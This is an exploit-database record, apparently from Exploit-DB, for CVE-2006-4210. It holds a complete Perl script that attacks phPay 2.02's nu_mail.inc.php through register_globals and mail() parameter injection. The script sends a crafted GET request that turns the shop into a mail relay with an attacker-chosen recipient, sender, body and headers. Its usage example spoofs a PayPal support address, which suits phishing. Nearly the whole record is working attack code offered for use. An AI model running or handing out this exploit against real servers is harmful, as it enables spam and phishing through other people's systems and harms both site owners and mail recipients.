{
  "id": "2181",
  "title": "PHPay 2.02 - &#039;nu_mail.inc.php?mail()&#039; Remote Injection",
  "cve": "CVE-2006-4210",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#####################\r\n# Script: phPay v2.02 http://phpay.de/\r\n# Vuln File: nu_mail.inc.php\r\n# Exploit & Advisory: beford <xbefordx gmail com>\r\n# Vulnerability: mail() Injection\r\n# Vuln Code:\r\n# <?php\r\n# if (ereg(\"nu_mail.inc.php\", $SCRIPT_NAME)) header(\"Location:./index.html\");\r\n# elseif (ereg(\"nu_mail.inc.php\", $_SERVER['SCRIPT_NAME'])) header(\"Location:./index.html\");\r\n# $mail_text=\"$mail_2a\\n\\n\";\r\n# ...\r\n# That *should* prevent direct access to the vulnerable file, but they didnt die()/exit()'ed\r\n# so, pwnt. You need register globals enabled to be able of exploiting this issue.\r\n#\r\n#####################\r\nuse LWP::UserAgent;\r\nuse URI::URL; \r\nprint \"\\n[*] phPay v2.02 nu_mail.inc.php mail() Injection\\n[*] exploit&advisory: beford <xbefordx gmail com>\\n\";\r\nif (scalar(@ARGV)<6) {\r\n\tprint \"\\tUsage:\\t./own.pl <host> <path> <email-to> <email-subject> <email-message> <email-from> [headers]\\n\";\r\n\tprint \"\\t<host> : orly\\n\";\r\n\tprint \"\\t<path> : folder where phpay is installed /phpay/ /phpayv2.02/ ..\\n\";\r\n\tprint \"\\t<email-to> <email-subject> <email-message> <email-from> : duh\\n\";\r\n\tprint \"\\t[headers] : optional extra headers for mail \\\"%0AContent-type: text/html%0A%0A\\\"\\n\\n\";\r\n\tprint \"\\t./own.pl http://www.vuln.es /phpayv2.02/ x\\@mail.co h4x \\\"hack\\\" support\\@paypal.com \\n\\n\";\r\n\texit;\r\n}\r\n$host = shift @ARGV;\r\n$path = shift @ARGV;\r\n$to = shift @ARGV;\r\n$subject = shift @ARGV;\r\n$message = shift @ARGV;\r\n$from = shift @ARGV;\r\n$headers = shift @ARGV;\r\nmy $url = URI::URL->new($full);\r\n$full = $url->as_string;\r\n$full =  \"${host}${path}nu_mail.inc.php?mail_text2=${message}&user_row[]=&user_row[5]=${to}&nu_mail_1=${subject}&shop_mail=${from}${headers}\";\r\nprint \"[*] exploiting $host\\n\";\r\n$ua = LWP::UserAgent->new;\r\n$req = HTTP::Request->new('GET',\"$full\");\r\n$res = $ua->request($req);\r\nprint \"\\t[*] mail sent\\n\" if $res->is_success;\r\n\r\n# milw0rm.com [2006-08-14]",
  "url": "https://www.exploit-db.com/exploits/2181"
}